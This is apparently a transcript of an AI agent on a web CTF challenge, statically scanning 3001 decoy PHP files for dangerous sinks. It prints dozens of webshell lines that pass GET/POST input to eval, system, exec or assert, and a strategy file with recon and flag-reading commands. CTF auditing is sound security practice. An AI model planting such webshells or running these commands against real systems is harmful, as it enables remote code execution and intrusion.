@@ -1,0 +1,1896 @@
+Reading additional input from stdin...
+OpenAI Codex v0.145.0
+--------
+workdir: /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+model: gpt-5.6-sol
+provider: openai
+approval: never
+sandbox: danger-full-access
+reasoning effort: medium
+reasoning summaries: none
+session id: 019fb69b-efb3-7a03-924e-a8a230193bbd
+--------
+user
+审计 /tmp/ctf-src.9vgiAJ/src 下 3001 个 PHP。系统化搜索 eval/assert/system/exec/include/unserialize/文件读写等危险调用及用户输入，定位最可能可利用文件。不要修改主文件。给出文件名、关键代码、建议 HTTP PoC。
+
+---
+完成后将结果写入 /home/stw/ctf-agent/challenges/manual_web_49388fea2961/branch_result_branch_001.md，格式:
+## Branch Result
+direction: dangerous_sink_scan
+subagent_id: branch_001
+status: FEASIBLE | INFEASIBLE
+### 发现
+(列出关键发现)
+### 命令和结果
+(关键命令及其输出)
+### 结论
+(可行/不可行 + 建议)
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+codex
+我会按危险 sink → 可控输入 → 调用链可达性三层筛选，并只写分支结果与协议状态文件，不改 `/tmp/ctf-src.9vgiAJ/src`。先读取现有看板和 Web 审计策略，再做批量静态扫描与重点文件复核。
+exec
+/bin/bash -lc "pwd && ls -la && sed -n '1,240p' board.md 2>/dev/null && sed -n '1,240p' progress.md 2>/dev/null && sed -n '1,260p' strategies/web.md 2>/dev/null" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+ exited 2 in 0ms:
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961
+total 84
+drwxr-xr-x  3 stw stw  4096 Jul 31 13:18 .
+drwxr-xr-x 11 stw stw  4096 Jul 31 13:15 ..
+-rw-r--r--  1 stw stw  1319 Jul 31 13:18 board.md
+srwxr-xr-x  1 stw stw     0 Jul 31 13:15 branch.sock
+-rw-r--r--  1 stw stw  1415 Jul 31 13:18 branch_001.log
+-rw-r--r--  1 stw stw  4048 Jul 31 13:18 branch_002.log
+-rw-r--r--  1 stw stw   557 Jul 31 13:18 branch_state.json
+-rw-r--r--  1 stw stw 39649 Jul 31 13:18 codex.log
+-rw-r--r--  1 stw stw     0 Jul 31 13:15 dead_ends.md
+-rw-r--r--  1 stw stw     0 Jul 31 13:18 guidance.md
+-rw-r--r--  1 stw stw  4553 Jul 31 13:18 hermes.log
+-rw-r--r--  1 stw stw    66 Jul 31 13:18 monitor_state.json
+drwxr-xr-x  2 stw stw  4096 Jul 31 13:15 poc_scripts
+-rw-r--r--  1 stw stw  1051 Jul 31 13:18 progress.md
+# Board
+
+## Target
+- URL: http://57709ff493e994dca798fef5.http-ctf2.dasctf.com:80
+- Type: web
+- Start: 2026-07-31T13:15:56+08:00
+
+## Ideas
+
+| ID | Status | Idea | Result | Updated |
+|----|--------|------|--------|---------|
+| 1 | testing | 下载 /www.tar.gz 源码包审计漏洞 | 已下载解压，96MB/3002文件 | 13:17 |
+| 2 | verified | 检查 robots/sitemap/.git 是否真实文件 | 均为软200，返回同一"被黑"页面 | 13:17 |
+| 3 | testing | md5sum 去重定位 3001 PHP 中的异类 | 待执行 | 13:17 |
+| 4 | testing | grep 扫危险函数定位后门 | 待执行 | 13:17 |
+| 5 | pending | 检查唯一 HTML 文件是否暴露入口 | 待执行 | 13:17 |
+
+## Memory
+
+| ID | Kind | Content | Source | Updated |
+|----|------|---------|--------|---------|
+| 1 | fact | 技术栈: OpenResty + PHP/7.3.5 | curl 响应头 | 13:16 |
+| 2 | evidence | 首页提示源码备份位于 /www.tar.gz | 首页内容 | 13:16 |
+| 3 | fact | robots/sitemap/.git 均为软200，返回"雁过留声"被黑页面 | curl 探测 | 13:17 |
+| 4 | fact | 源码解压后 3002 文件: 3001 PHP + 1 HTML，96MB | tar 解压 | 13:17 |
+| 5 | evidence | PHP 文件均为随机名，大小集中在 58-62KB，疑似诱饵模板 | 文件大小统计 | 13:17 |
+| 6 | fact | 解压目录: /tmp/ctf-src.9vgiAJ | progress.md | 13:17 |
+## Target
+- Type: web
+- URL: http://57709ff493e994dca798fef5.http-ctf2.dasctf.com:80
+- Background: 
+- Start Time: 2026-07-31T13:15:56+08:00
+
+## Current Phase
+recon / source acquisition
+
+## Next Steps
+1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
+2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+3. 汇总候选并进行 HTTP 验证
+
+## Key Artifacts
+- `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+- 首页提示网站源码备份位于 `/www.tar.gz`
+- `/tmp/www.tar.gz`: 有效 gzip，41,300,918 bytes，解压后约 96MB；含大量随机名 PHP
+- robots/sitemap/.git 均为首页统一软 200，不是真实资源
+- `/tmp/ctf-src.9vgiAJ`: 安全解压目录；共 3002 文件（3001 PHP + 1 HTML），96MB
+- 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+- 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+- 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
+
+## Flags Found
+(无)
+
+hook: PostToolUse
+hook: PostToolUse Completed
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..608382eb8310d49034c0f8f0c8f3a768899367da
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -21,6 +21,7 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..608382eb8310d49034c0f8f0c8f3a768899367da
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -21,6 +21,7 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "find /home/stw/ctf-agent -path '*/strategies/web.md' -o -path '*/strategies/*web*' | head -20; find /tmp/ctf-src.9vgiAJ/src -type f -name '*.php' | wc -l; find /tmp/ctf-src.9vgiAJ/src -type f | wc -l" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+ succeeded in 0ms:
+/home/stw/ctf-agent/strategies/web.md
+3001
+3002
+
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..608382eb8310d49034c0f8f0c8f3a768899367da
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -21,6 +21,7 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
+ 
+ ## Flags Found
+ (无)
+
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..ec0066d368534f297859d5480bc877675fc29d62
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 批量 `php -l` 检查语法有效性，利用运行可达性筛掉随机诱饵
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,11 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..ec0066d368534f297859d5480bc877675fc29d62
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 批量 `php -l` 检查语法有效性，利用运行可达性筛掉随机诱饵
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,11 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "sed -n '1,320p' /home/stw/ctf-agent/strategies/web.md" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+ succeeded in 0ms:
+# Web 题攻击流程
+
+## 侦察阶段 (5-10min)
+
+1. curl 探测目标，识别技术栈 (Server header、X-Powered-By、Cookie 特征)
+2. 端口扫描: `nmap -sV -p- <host>` (或快速 `nmap -sV <host>`)
+3. 目录扫描: `ffuf -u <url>/FUZZ -w common.txt -mc 200,301,302,403`
+4. 识别所有入口点 (GET/POST 参数、API 端点、上传点、登录框)
+5. 发现 2+ 攻击向量时，调 `branch.py spawn` 并行试探
+
+## 验证阶段 (每个向量 3-5min)
+
+- 选最高优先级向量全力推进
+- 单次失败不换方向
+- 同一命令参数微调不超 3 次
+- 同类操作连续 3 次无新发现 -> 换方向
+
+## 利用阶段 (充分投入)
+
+- 对确认漏洞深入利用
+- 拿到 RCE 先读 flag: `cat /flag*`、`find / -name "flag*"`、`env | grep -i flag`
+- 发现 flag 立即输出到 progress.md 的 Flags Found 段
+
+## 常见攻击面清单
+
+- SQL 注入: 联合查询 / 盲注 / 时间盲注 / 堆叠注入 / 二次注入
+- XSS: 反射 / 存储 / DOM (CTF 中通常用于窃取 cookie 或打 bot)
+- SSTI: {{7*7}} / ${7*7} / <%= 7*7 %> 测试不同模板引擎
+- 文件上传: 绕过扩展名/MIME/内容检查，getshell
+- 文件包含: LFI/RFI，读源码或日志getshell
+- 命令注入: ; | || && ` $() 反引号绕过
+- SSRF: 内网探测 / 读文件 / 打 Redis / gopher 协议
+- 反序列化: PHP (__wakeup/__destruct) / Java / Python pickle
+- 弱认证: 默认密码 / JWT 伪造 / session 固定
+- 逻辑漏洞: 越权 / 条件竞争 / 参数篡改
+
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..ec0066d368534f297859d5480bc877675fc29d62
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 批量 `php -l` 检查语法有效性，利用运行可达性筛掉随机诱饵
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,11 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "src=/tmp/ctf-src.9vgiAJ/src
+rg -n -i --glob '*.php' '\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\\s*\\(' \""'$src" > /tmp/branch001_exec_sinks.txt
+rg -n -i --glob '"'*.php' '\\b(include|include_once|require|require_once)\\b|\\b(unserialize|yaml_parse|preg_replace|create_function)\\s*\\(' \""'$src" > /tmp/branch001_include_deser.txt
+rg -n -i --glob '"'*.php' '\\b(file_get_contents|file_put_contents|fopen|fwrite|readfile|file|copy|rename|unlink|move_uploaded_file|parse_ini_file)\\s*\\(' \""'$src" > /tmp/branch001_fileio.txt
+rg -n --glob '"'*.php' '\\"'$_(GET|POST|REQUEST|COOKIE|FILES|SERVER)|php://input|getenv'"\\s*\\(' \""'$src" > /tmp/branch001_inputs.txt
+rg -n -i --glob '"'*.php' '\\b(call_user_func(_array)?|ReflectionFunction|register_shutdown_function|array_map|array_filter)\\s*\\(' \""'$src" > /tmp/branch001_dynamic.txt
+wc -l /tmp/branch001_exec_sinks.txt /tmp/branch001_include_deser.txt /tmp/branch001_fileio.txt /tmp/branch001_inputs.txt /tmp/branch001_dynamic.txt
+sed -n '"'1,120p' /tmp/branch001_exec_sinks.txt
+sed -n '1,80p' /tmp/branch001_include_deser.txt" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..ec0066d368534f297859d5480bc877675fc29d62
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 批量 `php -l` 检查语法有效性，利用运行可达性筛掉随机诱饵
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,11 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
+ 
+ ## Flags Found
+ (无)
+
+ succeeded in 162ms:
+   32290 /tmp/branch001_exec_sinks.txt
+    9395 /tmp/branch001_include_deser.txt
+       0 /tmp/branch001_fileio.txt
+  264901 /tmp/branch001_inputs.txt
+       0 /tmp/branch001_dynamic.txt
+  306586 total
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:3:exec($_GET['Q6kMBHJG2'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:6:system($_GET['rGSydEL3p'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:27: eval($_GET['sRy1uiY99'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:71:eval($_POST['ewlt7n3Ac'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:96:system($_GET['gdukQkHST'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:424:    exec($_GET['XSMoojvXL'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:450:    eval($_GET['waXVWiCOB'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:520:assert($yeHN8KY32);
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:642:eval($opOr1OMO8);
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:644:assert($_POST['Mkenvw4Fe'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:720:system($_GET['XP0aHnrtz'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php:771:assert($_GET['mTGtpga42'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:59:assert($_POST['HMiOND_im'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:63:assert($_GET['PYZ3IG860'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:144:    exec($_POST['CYlwU3Otl'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:166:exec($_POST['HJmAmufUQ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:182:    assert($swDBCSmhn);
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:279:assert($_GET['DHbDJj_6O'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:435:exec($_GET['VUnqP4cYs'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:524:    exec($_GET['Hl_9lQCkw'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:602:exec($_GET['nw58JD9lg'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:622:    assert($_GET['JcV95LiuA'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:624:    system($_POST['ko3oTpkv7'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:637:    assert($GjNbRcMSl);
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:736:    system($_GET['YcOEJ_b0m'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:762:eval($_POST['Bkg2WsHyx'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:846:eval($_POST['ywzmPTkyd'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:42:    assert($KGwvQsv1b);
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:283:exec($_GET['OOEdK3MW8'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:483:exec($_POST['KlWWHjZ9z'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:567:eval($_POST['BRf0aARDs'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:569:system($_POST['ebj03JMbk'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:594:eval($_GET['A5ie0vbXY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:646:eval($AQvuq4kuL);
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:680:eval($UOXmhvphC);
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:772:assert($_GET['nyeOpP6UI'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:774:system($_POST['v0rebqIPV'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:808:eval($_POST['kTUxwmCmQ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php:58:system($_GET['DpirzYfnT'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php:118:    assert($_GET['ZR_MmWjE2'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php:165:    assert($_POST['xoqRjujU1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php:212:    assert($J26FA56vC);
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php:356:eval($_GET['cI9qiCZdU'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ft45ev1aB9R.php:513:    eval($_GET['PJvhWpFp_'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:165:exec($_GET['BgOWorpdT'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:197:exec($_GET['JwY4AaSI2'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:309:exec($_GET['mf7oJ3TR1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:376:exec($_GET['YGzKwoe_H'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:392:eval($_POST['x7a6g2qF2'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:412:assert($_GET['OfD28iyij'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:476:     eval($_GET['oWjWq68JQ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:539:assert($Nt3XYJGkZ);
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:563:assert($_POST['NUx8NJLQ0'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:628:assert($_GET['RjaQwl6zU'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:694:system($_POST['C6jfb7Fq6'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:860:    assert($_GET['ZOMUp4grE'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:1064:eval($_GET['DaAqqbDWI'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:1086:system($_GET['T0gegtuWg'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:69:assert($iL9jas0AU);
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:75:    assert($_POST['rg1uW4rse'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:99:assert($_POST['fUtEE5wmi'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:246:exec($_GET['j2HJmJ7CX'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:271:eval($y0oIOp6pu);
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:309:eval($ByXQ1nZzi);
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:645:assert($_GET['z8_hTNjb4'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:690:eval($Tsa3_62Ob);
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:695:    eval($_POST['o7xKly2gm'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:725:    system($_GET['lS8Om6j3S'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:794:system($_POST['cNbW2Mlv_'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:847:    system($_GET['GIZNKpNGq'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:871:assert($_POST['h0zd4qsNN'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1080:assert($_GET['fbxpjqRAG'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1211:    system($_POST['HQ27bgAl5'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1215:exec($_GET['_pko1cB5x'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1260:assert($_GET['GhwYubsZs'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1322:system($_POST['UtnZaMxKB'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1349:assert($_GET['XyIAGz692'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1418:    system($_GET['qBKOTO4pn'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1420:     eval($_GET['PbTo_Ydu5'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1509:exec($_POST['OushtluyG'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1562:system($_GET['ftdFZXRXV'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:68:assert($_POST['VYA59G_mJ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:96:exec($_POST['Z_on48qLG'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:144: eval($_GET['zmTHN5ZOa'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:423:assert($GhxihdKPu);
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:462:eval($_GET['qwHD5sD1B'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:569:    system($_GET['pB__AZY1V'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:598:assert($_POST['U21BjvrDo'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:620:    assert($m9GqZlLvY);
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:791:exec($_POST['JAmLDI17r'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1160:    exec($_POST['RSl5s_Z27'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1289:    system($_POST['o3HC8qYoc'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1307:eval($_GET['nACJnUZxx'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1313:    exec($_GET['oJBbnYFiM'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1482:system($_POST['fXDGqHxDI'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1588:exec($_POST['D5wuJKzu6'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1599:system($_GET['USBMGABPH'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/UNrvHbLXrsf.php:1604:    exec($_GET['RQbDf85i1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:3:system($_POST['tEj5iglJ1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:110: eval($_GET['RzgDfZ1GA'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:235:system($_GET['P3FanRKz2'] ?? ' ');
